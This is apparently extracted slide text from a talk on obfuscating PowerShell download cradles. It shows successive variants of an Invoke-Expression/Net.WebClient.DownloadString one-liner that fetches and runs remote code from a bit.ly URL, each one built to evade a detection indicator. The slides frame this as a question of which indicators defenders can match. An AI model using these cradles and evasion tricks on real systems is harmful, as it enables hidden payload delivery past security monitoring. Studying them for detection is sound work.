etc.
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient).DownloadString( 'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
• ).Download
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient).DownloadString( 'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
• ).Download
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient).DownloadString( 'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
• ).Download
(New-Object Net.WebClient) can be set as a variable:
$wc = New-Object Net.Webclient;
$wc.DownloadString( 'ht'+'tps://bit.ly/L3g1t')
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient).DownloadString( 'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
• .Download
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient).DownloadString( 'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
• .Download                                             (Member token obfuscation?)                   
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient).'DownloadString'( 'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
• .Download                                             (single quotes…)                   
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient)."DownloadString"( 'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
• .Download                                             (double quotes…)                   
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient)."Down`loadString"( 'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
• Download                                                 (tick marks??)
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient)."Down`loadString"( 'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
• Download 
Get-Help about_Escape_Characters
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient)."`D`o`wn`l`oa`d`Str`in`g"( 'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
• Download 
Get-Help about_Escape_Characters
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient)."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
• Download 
Get-Help about_Escape_Characters
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient)."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
• Download
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient)."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
• Download
(Options: RegEx all the things or scratch this indicator)
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient)."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
• Download
(Options: RegEx all the things or scratch this indicator)
WebClient class has options: 
•
.DownloadString…
•
.DownloadFile…
•
.DownloadData…
•
.OpenRead
•
.OpenReadAsync
•
.OpenReadTaskAsync
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient)."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
• Download
(Options: RegEx all the things or scratch this indicator)
DownloadString CAN be treated as a string or variable with .Invoke! (req’d in PS2.0)
Invoke-Expression (New-Object Net.WebClient).("Down"+"loadString").Invoke( 
'ht'+'tps://bit.ly/L3g1t')
$ds = "Down"+"loadString"; Invoke-Expression (New-Object Net.WebClient).   
$ds.Invoke( 'ht'+'tps://bit.ly/L3g1t')
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient)."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient)."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
Obfuscating the Cradle
• Invoke-Expression (New-Object Net.WebClient)."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
We have options…
1.
(New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")
2.
(New-Object ("Net"+".Web"+"Client"))
3.
$var1="Net."; $var2="WebClient"; (New-Object $var1$var2)
Obfuscating the Cradle
• Invoke-Expression (New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Net.WebClient
We have options…
1.
(New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")
2.
(New-Object ("Net"+".Web"+"Client"))
3.
$var1="Net."; $var2="WebClient"; (New-Object $var1$var2)
Obfuscating the Cradle
• Invoke-Expression (New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
Obfuscating the Cradle
• Invoke-Expression (New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• There aren't any aliases for New-Object cmdlet, so shouldn't this be safe to trigger on?
If only PowerShell wasn't so helpful…
Obfuscating the Cradle
• Invoke-Expression (New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Get-Command 
shows all available 
functions, cmdlets, 
etc.
Obfuscating the Cradle
• Invoke-Expression (New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Get-Command  Return a single cmdlet name? Why not invoke it! 
• Invoke-Expression (Get-Command New-Object)
But we can be more creative…
Obfuscating the Cradle
• Invoke-Expression (New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Get-Command  Return a single cmdlet name? Why not invoke it!
• & (Get-Command New-Object)
• .   (Get-Command New-Object)
There we go… invocation ops
Obfuscating the Cradle
• Invoke-Expression (New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Get-Command  Wildcards are our friend…
• & (Get-Command New-Object)
• .   (Get-Command New-Object)
Obfuscating the Cradle
• Invoke-Expression (New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Get-Command  Wildcards are our friend…
• & (Get-Command New-Objec*)
• .   (Get-Command New-Objec*)
Obfuscating the Cradle
• Invoke-Expression (New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Get-Command  Wildcards are our friend…
• & (Get-Command New-Obje*)
• .   (Get-Command New-Obje*)
Obfuscating the Cradle
• Invoke-Expression (New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Get-Command  Wildcards are our friend…
• & (Get-Command New-Obj*)
• .   (Get-Command New-Obj*)
Obfuscating the Cradle
• Invoke-Expression (New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Get-Command  Wildcards are our friend…
• & (Get-Command New-Ob*)
• .   (Get-Command New-Ob*)
Obfuscating the Cradle
• Invoke-Expression (New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Get-Command  Wildcards are our friend…
• & (Get-Command New-O*)
• .   (Get-Command New-O*)
Obfuscating the Cradle
• Invoke-Expression (New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 
'ht'+'tps://bit.ly/L3g1t')
• What script block elements can we key off of for this?
• Invoke-Expression
• New-Object
• Get-Command  Wildcards are our friend…
• & (Get-Command *ew-O*)
• .   (Get-Command *ew-O*)
Obfuscating the Cradle
• Invoke-Expression (New-Object "`N`e`T`.`W`e`B`C`l`i`e`N`T")."`D`o`w`N`l`o`A`d`S`T`R`i`N`g"( 